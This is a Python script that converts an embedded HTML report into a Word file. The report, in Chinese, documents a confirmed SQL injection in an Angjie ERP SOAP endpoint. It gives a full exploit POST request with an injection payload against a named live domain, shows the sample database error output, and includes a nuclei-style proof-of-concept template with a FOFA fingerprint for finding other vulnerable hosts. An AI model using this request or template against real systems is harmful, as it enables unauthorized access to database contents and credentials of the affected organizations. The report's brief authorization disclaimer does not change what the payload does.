import h2d

html="""<h2>昂捷ERP SQL注入漏洞复现报告（已确认存在）</h2>\n\n<p>目标URL：http://djoutlets.cn/EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx</p>\n\n<h3>复现步骤：</h3>\n<ol>\n  <li>\n    <p>使用Burp Suite或Postman发送以下POST请求：</p>\n    <pre style=\"background:#f8f8f8;padding:10px;\">\nPOST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1\nConnection: keep-alive\nSOAPAction: \"http://tempuri.org/GetDictionary\"\nContent-Type: text/xml;charset=UTF-8\nHost: djoutlets.cn\nContent-Length: 327\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:GetDictionary>\n         <tem:sTableName>1'and 1=@@version--</tem:sTableName>\n      </tem:GetDictionary>\n   </soapenv:Body>\n</soapenv:Envelope>\n    </pre>\n  </li>\n  \n  <li>\n    <p>验证漏洞存在条件：</p>\n    <ul>\n      <li>响应状态码必须为 <strong>500</strong></li>\n      <li>响应正文中必须同时包含以下特征字符串：\n        <ul>\n          <li><code>Microsoft</code></li>\n          <li><code>nvarchar</code></li>\n        </ul>\n      </li>\n    </ul>\n  </li>\n</ol>\n\n<h3>漏洞验证示例：</h3>\n<p>当发送上述请求后，若返回类似以下错误响应则证明漏洞存在：</p>\n<pre style=\"background:#f8f8f8;padding:10px;\">\nSystem.Data.SqlClient.SqlException: 指令预期。\n位置 10。\nMicrosoft SQL Server 2019 (RTM-CU14) (KB5026268) 版本 15.0.4198.4 (x64) \n开发人员版本 ... \nnvarchar(128)...\n</pre>\n\n<h3>漏洞影响：</h3>\n<p>该SQL注入漏洞可被利用获取数据库敏感信息，包括但不限于数据库版本、表结构、用户凭证等，建议立即修复。</p>\n\n<p>注：本报告基于已确认的漏洞状态编写，复现过程中请确保符合目标系统的授权范围。</p><br><p>复现POC如下</p><pre><code class=\"Bash\">id: angjie_erp_cwsqry_sqli\n\ninfo:\n  name: angjie_erp_cwsqry_sqli\n  author: bugscanner\n  severity: critical\n  metadata:\n    vulnsystem: 昂捷ERP cwsapprove接口\n    uploaduri: /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx\n    vulntype: SQL注入\n    otherinfo: sql注入演示获取数据库名\n    fofasearch: body=\"/Scripts/EnjoyMsg.js\"\n\nhttp:\n  - raw:\n      - |\n        POST /EnjoyRMIS_WS/WS/ReportTool/cwsqry.asmx HTTP/1.1\n        Connection: keep-alive\n        SOAPAction: http://tempuri.org/GetDictionary\n        Content-Type: text/xml;charset=UTF-8\n        Host: \n        Content-Length: 327\n\n        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n           <soapenv:Header/>\n           <soapenv:Body>\n              <tem:GetDictionary>\n                 <!--type: string-->\n                 <tem:sTableName>1'and 1=@@version--</tem:sTableName>\n              </tem:GetDictionary>\n           </soapenv:Body>\n        </soapenv:Envelope>\n\n    matchers: \n      - type: dsl\n        condition: and\n        dsl:\n          - status_code == 500 &&  contains_all(body, 'nvarchar') && contains_all(body, 'Microsoft')</code></pre><p>复现截图：</p><p><img src=\"https://p0.ssl.qhimg.com/t111922529d027c30ecd8d6f89e.png\"/></p>"""
# h2d.setFont("../Hack-Font.ttf")
docx = h2d.convert(html)
docx.save('output.docx')